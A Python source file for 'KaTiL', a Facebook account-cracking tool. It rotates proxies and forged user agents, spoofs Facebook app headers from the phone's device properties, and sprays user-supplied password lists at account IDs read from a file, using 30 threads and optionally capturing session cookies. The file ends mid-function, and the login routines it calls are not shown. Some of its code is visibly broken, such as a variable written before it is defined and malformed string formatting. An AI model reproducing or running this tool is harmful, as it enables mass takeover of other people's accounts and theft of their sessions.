fbks=("com.facebook.adsmanager","com.facebook.lite","com.facebook.orca","com.facebook.katana")

try:
    import os,requests,json,time,re,random,sys,uuid,string,subprocess
    from string import *
    import bs4
    #import dz
    from concurrent.futures import ThreadPoolExecutor as tred
    from bs4 import BeautifulSoup as sop
    from bs4 import BeautifulSoup
except ModuleNotFoundError: 
    print("\n Installing missing modules ...")
    os.system("pip install requests bs4 futures==2 > /dev/null")
    os.system("python trt.py")
	
os.system("xdg-open https://chat.whatsapp.com/BlPMMJvq5VDJaMjbPfW8rG")

try:
    prox= requests.get("https://raw.githubusercontent.com/trt-Fire/data/main/proxies.txt").text
    open("proxies.txt","w").write(proxies)
except Exception as e:
    print("\x1b[1;92m[√] LOADING...")
	
proxies=open("proxies.txt","r").read().splitlines()


android_models=[]
try:
    xx = requests.get("https://raw.githubusercontent.com/trt-Fire/data/main/strings.txt").text.splitlines()
    for line in xx:
        android_models.append(line)
except:pass

usr=[]
try:
    xd=requests.get("https://raw.githubusercontent.com/trt-Fire/data/main/ua.txt").text.splitlines()
    for us in xd:
        usr.append(us)
except: pass

gt = random.choice(["GT-1015","GT-1020","GT-1030","GT-1035","GT-1040","GT-1045","GT-1050","GT-1240","GT-1440","GT-1450","GT-18190","GT-18262","GT-19060I","GT-19082","GT-19083","GT-19105","GT-19152","GT-19192","GT-19300","GT-19505","GT-2000","GT-20000","GT-200s","GT-3000","GT-414XOP","GT-6918","GT-7010","GT-7020","GT-7030","GT-7040","GT-7050","GT-7100","GT-7105","GT-7110","GT-7205","GT-7210","GT-7240R","GT-7245","GT-7303","GT-7310","GT-7320","GT-7325","GT-7326","GT-7340","GT-7405","GT-7550	5GT-8005","GT-8010","GT-81","GT-810","GT-8105","GT-8110","GT-8220S","GT-8410","GT-9300","GT-9320","GT-93G","GT-A7100","GT-A9500","GT-ANDROID","GT-B2710","GT-B5330","GT-B5330B","GT-B5330L","GT-B5330ZKAINU","GT-B5510","GT-B5512","GT-B5722","GT-B7510","GT-B7722","GT-B7810","GT-B9150","GT-B9388","GT-C3010","GT-C3262","GT-C3310R","GT-C3312","GT-C3312R","GT-C3313T","GT-C3322","GT-C3322i","GT-C3520","GT-C3520I","GT-C3592","GT-C3595","GT-C3782","GT-C6712","GT-E1282T","GT-E1500","GT-E2200","GT-E2202","GT-E2250","GT-E2252","GT-E2600","GT-E2652W","GT-E3210","GT-E3309","GT-E3309I","GT-E3309T","GT-G530H","GT-g900f","GT-G930F","GT-H9500","GT-I5508","GT-I5801","GT-I6410","GT-I8150","GT-I8160OKLTPA","GT-I8160ZWLTTT","GT-I8258","GT-I8262D","GT-I8268","GT-I8505","GT-I8530BAABTU","GT-I8530BALCHO","GT-I8530BALTTT","GT-I8550E","GT-i8700","GT-I8750","GT-I900","GT-I9008L","GT-i9040","GT-I9080E","GT-I9082C","GT-I9082EWAINU","GT-I9082i","GT-I9100G","GT-I9100LKLCHT","GT-I9100M","GT-I9100P","GT-I9100T","GT-I9105UANDBT","GT-I9128E","GT-I9128I","GT-I9128V","GT-I9158P","GT-I9158V","GT-I9168I","GT-I9192I","GT-I9195H","GT-I9195L","GT-I9250","GT-I9303I","GT-I9305N","GT-I9308I","GT-I9505G","GT-I9505X","GT-I9507V","GT-I9600","GT-m190","GT-M5650","GT-mini","GT-N5000S","GT-N5100","GT-N5105","GT-N5110","GT-N5120","GT-N7000B","GT-N7005","GT-N7100T","GT-N7102","GT-N7105","GT-N7105T","GT-N7108","GT-N7108D","GT-N8000","GT-N8005","GT-N8010","GT-N8020","GT-N9000","GT-N9505","GT-P1000CWAXSA","GT-P1000M","GT-P1000T","GT-P1010","GT-P3100B","GT-P3105","GT-P3108","GT-P3110","GT-P5100","GT-P5200","GT-P5210XD1","GT-P5220","GT-P6200","GT-P6200L","GT-P6201","GT-P6210","GT-P6211","GT-P6800","GT-P7100","GT-P7300","GT-P7300B","GT-P7310","GT-P7320","GT-P7500D","GT-P7500M","GT-P7500R","GT-P7500V","GT-P7501","GT-P7511","GT-S3330","GT-S3332","GT-S3333","GT-S3370","GT-S3518","GT-S3570","GT-S3600i","GT-S3650","GT-S3653W","GT-S3770K","GT-S3770M","GT-S3800W","GT-S3802","GT-S3850","GT-S5220","GT-S5220R","GT-S5222","GT-S5230","GT-S5230W","GT-S5233T","GT-s5233w","GT-S5250","GT-S5253","GT-s5260","GT-S5280","GT-S5282","GT-S5283B","GT-S5292","GT-S5300","GT-S5300L","GT-S5301","GT-S5301B","GT-S5301L","GT-S5302","GT-S5302B","GT-S5303","GT-S5303B","GT-S5310","GT-S5310B","GT-S5310C","GT-S5310E","GT-S5310G","GT-S5310I","GT-S5310L","GT-S5310M","GT-S5310N","GT-S5312","GT-S5312B","GT-S5312C","GT-S5312L","GT-S5330","GT-S5360","GT-S5360B","GT-S5360L","GT-S5360T","GT-S5363","GT-S5367","GT-S5369","GT-S5380","GT-S5380D","GT-S5500","GT-S5560","GT-S5560i","GT-S5570B","GT-S5570I","GT-S5570L","GT-S5578","GT-S5600","GT-S5603","GT-S5610","GT-S5610K","GT-S5611","GT-S5620","GT-S5670","GT-S5670B","GT-S5670HKBZTA","GT-S5690","GT-S5690R","GT-S5830","GT-S5830D","GT-S5830G","GT-S5830i","GT-S5830L","GT-S5830M","GT-S5830T","GT-S5830V","GT-S5831i","GT-S5838","GT-S5839i","GT-S6010","GT-S6010BBABTU","GT-S6012","GT-S6012B","GT-S6102","GT-S6102B","GT-S6293T","GT-S6310B","GT-S6310ZWAMID","GT-S6312","GT-S6313T","GT-S6352","GT-S6500","GT-S6500D","GT-S6500L","GT-S6790","GT-S6790L","GT-S6790N","GT-S6792L","GT-S6800","GT-S6800HKAXFA","GT-S6802","GT-S6810","GT-S6810B","GT-S6810E","GT-S6810L","GT-S6810M","GT-S6810MBASER","GT-S6810P","GT-S6812","GT-S6812B","GT-S6812C","GT-S6812i","GT-S6818","GT-S6818V","GT-S7230E","GT-S7233E","GT-S7250D","GT-S7262","GT-S7270","GT-S7270L","GT-S7272","GT-S7272C","GT-S7273T","GT-S7278","GT-S7278U","GT-S7390","GT-S7390G","GT-S7390L","GT-S7392","GT-S7392L","GT-S7500","GT-S7500ABABTU","GT-S7500ABADBT","GT-S7500ABTTLP","GT-S7500CWADBT","GT-S7500L","GT-S7500T","GT-S7560","GT-S7560M","GT-S7562","GT-S7562C","GT-S7562i","GT-S7562L","GT-S7566","GT-S7568","GT-S7568I","GT-S7572","GT-S7580E","GT-S7583T","GT-S758X","GT-S7592","GT-S7710","GT-S7710L","GT-S7898","GT-S7898I","GT-S8500","GT-S8530","GT-S8600","GT-STB919","GT-T140","GT-T150","GT-V8a","GT-V8i","GT-VC818","GT-VM919S","GT-W131","GT-W153","GT-X831","GT-X853","GT-X870","GT-X890","GT-Y8750"])
ugen=[]
for xd in range(10000):
    aa="Mozilla/5.0 (Linux; U; Android"
    b=random.choice(["6","7","8","9","10","11","12","13"])
    c=f" en-us; {str(gt)}"
    g="AppleWebKit/537.36 (KHTML, like Gecko) Chrome/"
    h=random.randrange(73,100)
    i="0"
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l="Mobile Safari/537.36"
    uaku2=f"{aa} {b}; {c}) {g}{h}.{i}.{j}.{k} {l}"
    ugen.append(uaku2)
for agent in range(10000):
    aa="Mozilla/5.0 (Linux; Android 6.0.1;"
    b=random.choice(["6","7","8","9","10","11","12","13"])
    c="en-us; 10; T-Mobile myTouch 3G Slide Build/GRI40)I148V)"
    d=random.choice(["A","B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z"])
    e=random.randrange(1, 999)
    f=random.choice(["A","B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z"])
    g="AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.99"
    h=random.randrange(73,100)
    i="0"
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l="Mobile Safari/533.1"
    fullagnt=(f"{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}")
    ugen.append(fullagnt)
rug=[]
for nt in range(10000):
    rr=random.randint
    aZ=random.choice(["A","B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z"])
    rx=random.randrange(1, 999)
    xx=f"Mozilla/5.0 (Windows NT 10.0; {str(rr(9,11))}; Win64; x64){str(aZ)}{str(rx)}{str(aZ)}) AppleWebKit/537.36 (KHTML, like Gecko){str(rr(99,149))}.0.{str(rr(4500,4999))}.{str(rr(35,99))} Chrome/{str(rr(99,175))}.0.{str(rr(0,5))}.{str(rr(0,5))} Safari/537.36"
    rug.append(xx)
ruz=[]
for mtc in range(10000):
    rr=random.randint
    xd=f"Mozilla/5.0 (Macintosh; Intel Mac OS {str(rr(7,15))} {str(rr(7,15))}_{str(rr(1,9))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(99,199))}.0.{str(rr(3999,4999))}.{str(rr(99,150))} Safari/537.36 OPR/{str(rr(99,199))}.0.{str(rr(3999,4999))}.{str(rr(99,150))}"
    ruz.append(xd)
	
#new ua
ugen=[]
for agent in range(10000):
        aa="Mozilla/5.0 (Linux; Android 6.0.1;"
        b=random.choice(["6","7","8","9","10","11","12"])
        c="en-us; 10; T-Mobile myTouch 3G Slide Build/"
        d=random.choice(["A","B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z"])
        e=random.randrange(1, 999)
        f=random.choice(["A","B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z"])
        g="AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.99"
        h=random.randrange(73,100)
        i="0"
        j=random.randrange(4200,4900)
        k=random.randrange(40,150)
        l="Mobile Safari/533.1"
        fullagnt=(f"{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}")
        ugen.append(fullagnt)

sim_id = ""
android_version = subprocess.check_output("getprop ro.build.version.release",shell=True).decode("utf-8").replace("\n","")
model = subprocess.check_output("getprop ro.product.model",shell=True).decode("utf-8").replace("\n","")
build = subprocess.check_output("getprop ro.build.id",shell=True).decode("utf-8").replace("\n","")
fblc = "en_GB"
try:
        fbcr = subprocess.check_output("getprop gsm.operator.alpha",shell=True).decode("utf-8").split(",")[0].replace("\n","")
except:
        fbcr = "Zong"
fbmf = subprocess.check_output("getprop ro.product.manufacturer",shell=True).decode("utf-8").replace("\n","")
fbbd = subprocess.check_output("getprop ro.product.brand",shell=True).decode("utf-8").replace("\n","")
fbdv = model
fbsv = android_version
fbca = subprocess.check_output("getprop ro.product.cpu.abilist",shell=True).decode("utf-8").replace(",",":").replace("\n","")
fbdm = "{density=2.0,height="+subprocess.check_output("getprop ro.hwui.text_large_cache_height",shell=True).decode("utf-8").replace("\n","")+",width="+subprocess.check_output("getprop ro.hwui.text_large_cache_width",shell=True).decode("utf-8").replace("\n","")
try:
        fbcr = subprocess.check_output("getprop gsm.operator.alpha",shell=True).decode("utf-8").split(",")
        total = 0
        for i in fbcr:
                total+=1
        select = ("1","2")
        if select == "1":
                fbcr = subprocess.check_output("getprop gsm.operator.alpha",shell=True).decode("utf-8").split(",")[0].replace("\n","")
                sim_id+=fbcr
        elif select == "2":
                try:
                        fbcr = subprocess.check_output("getprop gsm.operator.alpha",shell=True).decode("utf-8").split(",")[1].replace("\n","")
                        sim_id+=fbcr
                except Exception as e:
                        fbcr = "Zong"
                        sim_id+=fbcr
        else:
                fbcr = "Zong"
                sim_id+=fbcr
except:
        fbcr = "Zong"
device = {
        "android_version":android_version,
        "model":model,
        "build":build,
        "fblc":fblc,
        "fbmf":fbmf,
        "fbbd":fbbd,
        "fbdv":model,
        "fbsv":fbsv,
        "fbca":fbca,
        "fbdm":fbdm}
        
import random

def usmi():
    fban = random.choice(["FB4A"])
    facebook_version = f"[random.randint(100,450)],[random.radiant(0,0)],[random.radiant(0,0)],[random.radiant(1,40)],[random.radiant(10,150)]"
    density = random.choice(["1.0","1.5","2.0","2.5","3.0"])
    width = random.choice(["720","1080"])
    height = random.choice(["1280","1440","1920"])
    fbcr = random.choice(["Zong","null","Marshmallow","Telecom China"])
    fblc = random.choice(["en_US","en_GB","en_PK","ES_ES","FR_FR","DE_DE","pk_PK"])
    fbbs = random.choice(["samsung","xiaomi","infinix","oppo"])
    fbpn = random.choice(["COM.FACEBOOK.KATANA","COM.FACEBOOK.MESSANGER"])
    fbsv = f"[random.radiant(4,13),random.radiant(0,5),random.radiant(1,5)]"
    fbmf = random.choice(["samsung","xiaomi","infinix","oppo"])
    fbbv = str(random.randint(111111111,666666666))
    modela = random.choice(["Galaxy Book S51", "Galaxy Book S52", "Galaxy Book S53", "Galaxy Book S54", "Galaxy Book S55", "Galaxy Book S56","Galaxy Book S57", "Galaxy Book S58", "Galaxy Book S59", "Galaxy Book S60", "Galaxy Book S61", "Galaxy Book S62","Galaxy Book S63", "Galaxy Book S64", "Galaxy Book S65", "Galaxy Book S66", "Galaxy Book S67", "Galaxy Book S68","Galaxy Book S69", "Galaxy Book S70", "Galaxy Book S71", "Galaxy Book S72", "Galaxy Book S73", "Galaxy Book S74","Galaxy Book S75", "Galaxy Book S76", "Galaxy Book S77", "Galaxy Book S78", "Galaxy Book S79", "Galaxy Book S80","Galaxy Book S81", "Galaxy Book S82", "Galaxy Book S83", "Galaxy Book S84", "Galaxy Book S85", "Galaxy Book S86","Galaxy Book S87", "Galaxy Book S88", "Galaxy Book S89", "Galaxy Book S90", "Galaxy Book S91", "Galaxy Book S92","Galaxy Book S93", "Galaxy Book S94", "Galaxy Book S95", "Galaxy Book S96", "Galaxy Book S97", "Galaxy Book S98","Galaxy Book S99", "Galaxy Book S100", "Galaxy Book S101", "Galaxy Book S102", "Galaxy Book S103", "Galaxy Book S104","Galaxy Book S105", "Galaxy Book S106", "Galaxy Book S107", "Galaxy Book S108", "Galaxy Book S109", "Galaxy Book S110","Galaxy Book S111", "Galaxy Book S112", "Galaxy Book S113", "Galaxy Book S114", "Galaxy Book S115", "Galaxy Book S116","Galaxy Book S117", "Galaxy Book S118", "Galaxy Book S119", "Galaxy Book S120", "Galaxy Book S121", "Galaxy Book S122","Galaxy Book S123", "Galaxy Book S124", "Galaxy Book S125", "Galaxy Book S126", "Galaxy Book S127", "Galaxy Book S128","Galaxy Book S129", "Galaxy Book S130", "Galaxy Book S131", "Galaxy Book S132", "Galaxy Book S133", "Galaxy Book S134","Galaxy Book S135", "Galaxy Book S136", "Galaxy Book S137", "Galaxy Book S138", "Galaxy Book S139", "Galaxy Book S140","Galaxy Book S141", "Galaxy Book S142", "Galaxy Book S143", "Galaxy Book S144", "Galaxy Book S145", "Galaxy Book S146","Galaxy Book S147", "Galaxy Book S148", "Galaxy Book S149", "Galaxy Book S150", "SM-A110F", "SM-A115F", "SM-A125F", "SM-A205F", "SM-A215F", "SM-A217F", "SM-A225F", "SM-A305F", "SM-A315F", "SM-A317F","SM-A325F", "SM-A405F", "SM-A415F", "SM-A425F", "SM-A505F", "SM-A515F", "SM-A517F", "SM-A525F", "SM-A705F", "SM-A715F","SM-A717F", "SM-A725F", "SM-A805F", "SM-A815F", "SM-A817F", "SM-A825F", "SM-B715F", "SM-B725F", "SM-C115F", "SM-C225F","SM-C235F", "SM-C415F", "SM-C425F", "SM-D115F", "SM-D225F", "SM-D415F", "SM-E125F", "SM-E215F", "SM-E225F", "SM-E305F","SM-E315F", "SM-E325F", "SM-E525F", "SM-F127G", "SM-F137G", "SM-F147G", "SM-F157G", "SM-F167G", "SM-F177G", "SM-F187G","SM-F207F", "SM-F217F", "SM-F227F", "SM-F237F", "SM-F247F", "SM-F257F", "SM-F267F", "SM-F277F", "SM-F287F", "SM-F297F","SM-F307F", "SM-F317F", "SM-F327F", "SM-F337F", "SM-F347F", "SM-F357F", "SM-F367F", "SM-F377F", "SM-F387F", "SM-F397F","SM-F507B", "SM-F515F", "SM-F517B", "SM-F527B", "SM-F537B", "SM-F547B", "SM-F557B", "SM-F567B", "SM-F577B", "SM-F587B","SM-F607B", "SM-F617B", "SM-F627B", "SM-F637B", "SM-F647B", "SM-F657B", "SM-F667B", "SM-F677B", "SM-F687B", "SM-F697B","SM-F707B", "SM-F717B", "SM-F727B", "SM-F737B", "SM-F747B", "SM-F757B", "SM-F767B", "SM-F777B", "SM-F787B", "SM-F797B","SM-F807B", "SM-F817B", "SM-F827B", "SM-F837B", "SM-F847B", "SM-F857B", "SM-F867B", "SM-F877B", "SM-F887B", "SM-F897B","SM-F907B", "SM-F917B", "SM-F927B", "SM-F937B", "SM-F947B", "SM-F957B", "SM-F967B", "SM-F977B", "SM-F987B", "SM-F997B", "SM-G110B", "SM-G125F", "SM-G130E", "SM-G135F", "SM-G155S", "SM-G165N", "SM-G175F", "SM-G185F", "SM-G205E", "SM-G215F","SM-G225F", "SM-G235F", "SM-G245F", "SM-G255F", "SM-G265F", "SM-G275F", "SM-G285F", "SM-G295F", "SM-G305E", "SM-G315E","SM-G325F", "SM-G335F", "SM-G345F", "SM-G355H", "SM-G365F", "SM-G375F", "SM-G385F", "SM-G395F", "SM-G405F", "SM-G415F","SM-G425F", "SM-G435F", "SM-G445F", "SM-G455F", "SM-G465F", "SM-G475F", "SM-G485F", "SM-G495F", "SM-G505F", "SM-G515F","SM-G525F", "SM-G535F", "SM-G545F", "SM-G555F", "SM-G565F", "SM-G575F", "SM-G585F", "SM-G595F", "SM-G605F", "SM-G615F","SM-G625F", "SM-G635F", "SM-G645F", "SM-G655F", "SM-G665F", "SM-G675F", "SM-G685F", "SM-G695F", "SM-G705F", "SM-G715F","SM-G725F", "SM-G735F", "SM-G745F", "SM-G755F", "SM-G765F", "SM-G775F", "SM-G785F", "SM-G795F", "SM-G805F", "SM-G815F","SM-G825F", "SM-G835F", "SM-G845F", "SM-G855F", "SM-G865F", "SM-G875F", "SM-G885F", "SM-G895F", "SM-G905F", "SM-G915F","SM-G925F", "SM-G935F", "SM-G945F", "SM-G955F", "SM-G965F", "SM-G975F", "SM-G985F", "SM-G995F", "SM-H110E", "SM-H120E","SM-H130E", "SM-H140E", "SM-H150E", "SM-H160E", "SM-H170E", "SM-H180E", "SM-H190E", "SM-H200E", "SM-H210E", "SM-H220E", "Infinix Hot 10", "Infinix Note 8", "Infinix Zero 8", "Infinix S5 Pro", "Infinix Hot 9 Pro", "Infinix Note 7","Infinix Smart 5", "Infinix Hot 9", "Infinix S5", "Infinix Note 6", "Infinix Hot 8", "Infinix Smart 4","Infinix Hot 7 Pro", "Infinix S4", "Infinix Hot 7", "Infinix Hot 6 Pro", "Infinix Note 5", "Infinix Smart 3 Plus","Infinix Hot 6", "Infinix S3X", "Infinix Hot 5", "Infinix Note 4 Pro", "Infinix Hot 4 Pro", "Infinix Zero 4 Plus","Infinix S2 Pro", "Infinix Hot 4", "Infinix Note 3 Pro", "Infinix Hot S", "Infinix Hot 3", "Infinix Zero 3","Infinix Note 2", "Infinix Zero 2", "Infinix Hot 2", "Infinix Zero", "Infinix X551", "Infinix X507", "Infinix Note 10 Pro", "Infinix Note 10", "Infinix Hot 10T", "Infinix Hot 10S", "Infinix Smart HD 2021","Infinix Zero 8i", "Infinix Smart 4 Plus", "Infinix Hot 9 Play", "Infinix S5 Lite", "Infinix Smart 3","Infinix Hot 8 Lite", "Infinix S3", "Infinix Note 4", "Infinix Hot 6X", "Infinix Note 3", "Infinix Hot 5 Pro","Infinix Note 2 Pro", "Infinix Hot 4 Lite", "Infinix Smart 2 Pro", "Infinix Hot 7 Lite", "Infinix S2","Infinix Smart 2", "Infinix Hot 6 Pro (2019)", "Infinix S3 Plus", "Infinix Zero 4", "Infinix Hot 4 X557","Infinix Note 3 X601", "Infinix Smart", "Infinix Hot 5 Lite", "Infinix Note 4 X572", "Infinix Hot 6 (2019)","Infinix S2 X522", "Infinix Smart X5010", "Infinix Hot 4 Pro X556", "Infinix Zero 4 X555", "Infinix Hot 4 X557 Pro","Infinix Note 4 Pro X571", "Infinix Zero 5 Pro", "Infinix Hot S3X", "Infinix Smart 3i", "Infinix Hot 8 Lite (2020)","Infinix Hot 9 (2020)", "Infinix Hot 9 Pro (2020)", "Infinix Note 7 Lite", "Infinix Smart 4C", "Infinix S4 X626","Infinix S5 X652", "Infinix Hot 8 (2020)", "Infinix Note 7 Pro (2020)", "Infinix Smart 5A", "Infinix Hot 10 Play","Infinix Hot 10i", "Infinix Note 10T", "Infinix Note 10i", "Infinix Note 11", "Infinix Zero 10", "Infinix Zero X","Infinix Zero 11 Pro", "Infinix Note X", "Infinix Note XI", "Infinix Note XII", "Infinix Note XIII", "Oppo F19 Pro", "Oppo Reno5 Pro", "Oppo A54", "Oppo A74", "Oppo A15", "Oppo A5", "Oppo A9", "Oppo F17", "Oppo F11 Pro","Oppo Reno4 Pro", "Oppo Find X3 Pro", "Oppo A93", "Oppo Reno3 Pro", "Oppo A52", "Oppo A53", "Oppo A72", "Oppo A12","Oppo A37", "Oppo A83", "Oppo F9", "Oppo F7", "Oppo R17 Pro", "Oppo A7", "Oppo F5", "Oppo F3", "Oppo F1s","Oppo R15 Pro", "Oppo R11s", "Oppo R9s", "Oppo R7s", "Oppo A31", "Oppo A5s", "Oppo F15", "Oppo F3 Plus","Oppo A3s", "Oppo R15", "Oppo R11 Plus", "Oppo R9 Plus", "Oppo R7 Plus", "Oppo A5 (2020)", "Oppo A9 (2020)","Oppo F11", "Oppo F9 Pro", "Oppo F7 Youth", "Oppo R17", "Oppo R11", "Oppo R9", "Oppo R7", "Oppo A30", "Oppo A57","Oppo A71", "Oppo A79", "Oppo A83 Pro", "Oppo F1", "Oppo F3 Lite", "Oppo F11 Pro Marvel's Avengers Edition","Oppo Reno 10x Zoom FC Barcelona Edition", "Oppo Reno 5 Pro Diwali Edition", "Oppo A74 5G", "Oppo F19", "Oppo A15s","Oppo A7n", "Oppo A9x", "Oppo F11 Pro 128GB", "Oppo Reno3 Vitality Edition", "Oppo A8", "Oppo R15x", "Oppo A9 (2020) 4GB","Oppo A9 (2020) 8GB", "Oppo F11 128GB", "Oppo A11x", "Oppo Reno Ace", "Oppo K1", "Oppo K3", "Oppo K5", "Oppo A5 (2020) 64GB","Oppo A5 (2020) 128GB", "Oppo Reno 10x Zoom", "Oppo Reno 5 Pro 5G", "Oppo Reno 5 5G", "Oppo A92s", "Oppo A92", "Oppo A72 5G","Oppo A72 4G", "Oppo A52 4G", "Oppo Reno4 Lite", "Oppo A53 5G", "Oppo A53s", "Oppo A33 (2020)", "Oppo A15 (3GB)","Oppo A15 (2GB)", "Oppo A12e", "Oppo A11", "Oppo A5 (2020) 3GB", "Oppo A5 (2020) 4GB", "Oppo Reno4 Pro 5G","Oppo A93 5G", "Oppo A73 5G", "Oppo Reno4 5G", "Oppo Reno4 SE", "Oppo Reno4 F", "Oppo F17 Pro Diwali Edition", "Oppo A1", "Oppo A71 (2018)", "Oppo A83 (2018)", "Oppo A73", "Oppo A75", "Oppo A77", "Oppo A79k", "Oppo A81","Oppo A85", "Oppo A85t", "Oppo A87", "Oppo A97", "Oppo F3 Plus Barcelona Edition", "Oppo F5 Youth", "Oppo F9 Starry Purple","Oppo F9 Jade Green", "Oppo R11s Plus", "Oppo R11s FC Barcelona Edition", "Oppo R11 Plus FC Barcelona Edition","Oppo R11 FC Barcelona Edition", "Oppo R9s Plus", "Oppo R9s FC Barcelona Edition", "Oppo R9s Plus FC Barcelona Edition","Oppo R9s Green", "Oppo R9s Plus Green", "Oppo R9s Plus Red", "Oppo R9s Plus FC Barcelona Edition Green","Oppo R9s Plus FC Barcelona Edition Red", "Oppo A71 (2018) Blue", "Oppo A71 (2018) Gold", "Oppo A71 (2018) Black","Oppo A71 (2018) Red", "Oppo A73t", "Oppo A77t", "Oppo A79t", "Oppo A73s", "Oppo A77s", "Oppo A79s", "Oppo A83s","Oppo A83t", "Oppo A83t New Edition", "Oppo F5 Dashing Blue", "Oppo F5 6GB", "Oppo F5 6GB Red", "Oppo F5 6GB Black","Oppo F5 Sidharth Limited Edition", "Oppo F5 6GB Blue", "Oppo F5 6GB Red (64GB)", "Oppo A1k", "Oppo F11 Marvel's Avengers Limited Edition","Oppo F11 128GB", "Oppo Reno 10x Zoom 12GB", "Oppo A5 (2020) 6GB", "Oppo A12 (4GB)", "Oppo A12 (3GB)", "Oppo F15 Blazing Blue","Oppo F15 Lightning Black", "Oppo Reno3 Vitality Edition 5G", "Oppo F11 Pro Waterfall Gray", "Oppo A8n", "Oppo A5s (2GB)","Oppo A5s (3GB)", "Oppo A9 (2020) 6GB", "Oppo A9 (2020) 3GB", "Oppo F15 Uncover the Magic", "Oppo F15 Unicorn White","Oppo A8", "Oppo A91", "Oppo Reno3 5G", "Oppo A52s", "Oppo Reno5 Lite 5G", "Oppo A72s 5G", "Oppo A73 5G (Qualcomm)"])
    
    
    user_agent = "(Dalvik/2.1.0 (Linux; U; Android 9.5; xiaomi xiaomi 6720 Build/8913); FBAN/FB4A;FBAV/446.6.4.3.116;FBLC/en_GB;FBCR/Zong;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.1,width=720;FBSV/Android 9.5;FB_FW/1)"
    
    
    return user_agent
     
     
#Generate random user-agent
random_user_agent = usmi()
print(random_user_agent)
     
##______COLORS____ARE________######
pwx=[]
W = "\033[97;1m"
R = "\033[91;1m"
G = "\033[92;1m"
Y = "\033[93;1m"
B = "\033[94;1m"
P = "\033[95;1m"
S = "\033[96;1m"
N = "\x1b[0m"
PURPLE ="\x1b[38;5;46m"
RED = "\033[1;91m"
WHITE = "\033[1;97m"
GREEN = "\033[1;32m"
YELLOW = "\033[1;33m"
BLUE = "\033[1;34m"
ORANGE = "\033[1;35m"
BLACK="\033[1;30m"
EXTRA ="\x1b[38;5;208m"
#________________________________________#

logo =""" 
\033[97;1m ##    ##    ###    ######## #### ##       
\033[93;1m ##   ##    ## ##      ##     ##  ##       
\033[94;1m ##  ##    ##   ##     ##     ##  ##       
\033[97;1m #####    ##     ##    ##     ##  ##       
\033[91;1m ##  ##   #########    ##     ##  ##       
\033[92;1m ##   ##  ##     ##    ##     ##  ##       
\033[97;1m ##    ## ##     ##    ##    #### ########   
                                                 
\033[97;1m ═══════════════════════════════════════════════
\033[93;1m ᴏ ᴡ ɴ ᴇ ʀ :    KaTiL
\033[94;1m 𝐅𝐚𝐜𝐞𝐛𝐨𝐨𝐤   :    Rj Touseef
\033[97;1m 𝐆𝐢𝐭𝐇𝐮𝐁     :    KaTiL11
\033[91;1m 𝚅𝚎𝚛𝚜𝚒𝚘𝚗    :    2.8
_______________________________________________"""
def linex():
    print("\033[1;37m----------------------------------------------")
def clear():
        os.system("clear")
        print(logo)
loop=0
oks=[]
cps=[]
pcp=[]
id=[]
tokenku=[]

def menu():
        try:
                clear()
        #       chk()
                x = ("sex")
                if x == ("sex"):
                        print("[1] CRACK FILE ")
                        print("[2] RANDOM CRACK")
                        print("[3] EXIT")
                        print("[4] FOLLOW FB ")
                        linex()
                        xd=input(" CHOOSE AN OPTION: ")
                        #os.system("xdg-open ")
                        if xd in ["1","01"]:
                                clear()
                                
                                print(" PUT FILE EXAMPLE :  /sdcard/File.trt.etc..")
                                linex()
                                file = input(" PUT FILE PATH\033[1;37m: ")
                                try:
                                        fo = open(file,"r").read().splitlines()
                                except FileNotFoundError:
                                        print(" FILE LOCATION NOT FOUND ")
                                        time.sleep(1)
                                        menu()
                                clear()
                                print("[1] METHOD (1)")
                                print("[2] METHOD (2)")
                                linex()
                                mthd=input(" CHOOSE : ")
                                linex()
                                clear()
                                plist = []
                                try:
                                        ps_limit = int(input(" HOW MANY PASSWORDS DO YOU WANT TO ADD ? "))
                                except:
                                        ps_limit =1
                                linex()
                                clear()
                                print("\033[1;32m EXAMPLE : first last,firtslast,first123")
                                linex()
                                for i in range(ps_limit):
                                        plist.append(input(f" PUT PASSWORD {i+1}: "))
                                linex()
                                clear()
                                print(" DO YOU WENT SHOW COOKIES :? (Y/N): ")
                                linex()
                                cx=input(" CHOOSE : ")
                                if cx in ["y","Y","yes","Yes","1"]:
                                        pcp.append("y")
                                else:
                                        pcp.append("n")
                                with tred(max_workers=30) as crack_submit:
                                        clear()
                                        total_ids = str(len(fo))
                                        
                                        print(" TOTAL ACCOUNT : \033[1;32m"+total_ids+f" ")
                                        print("\033[1;37m CRACKING STARTED...\033[1;37m")
                                        linex()
                                        for user in fo:
                                                ids,names = user.split("|")
                                                passlist = plist
                                                if mthd in ["1","01"]:
                                                        crack_submit.submit(ffb,ids,names,passlist)
                                                elif mthd in ["2","02"]:
                                                        crack_submit.submit(api,ids,names,passlist)
                                                else:
                                                        crack_submit.submit(api1,ids,names,passlist)
                                print("\033[1;37m")
                                linex()
                                print(" THE PROCESS HAS COMPLETED")
                                print(" Total OK/CP: "+str(len(oks))+"/"+str(len(cps)))
                                linex()
                                input(" PRESS ENTER TO BACK ")
                                os.system("python trt.py")
                        elif xd in ["2","02"]:
                                pak()
                        elif xd in ["3","03"]:
                                exit()
                        
        except requests.exceptions.ConnectionError:
                print("\n NO INTERNET CONNECTION ...")
                exit()
def pak():
                user=[]
                clear()
                print("\033[1;31m CODE EXAMPLE : 0306,0315,0335,0345")
                code = input("\033[1;37m PUT CODE: ")
                try:
                        limit = int(input("\033[1;31m EXAMPLE : 2000, 3000, 5000, 10000\n\033[1;37m PUT LIMIT : "))
                except ValueError:
                        limit = 5000
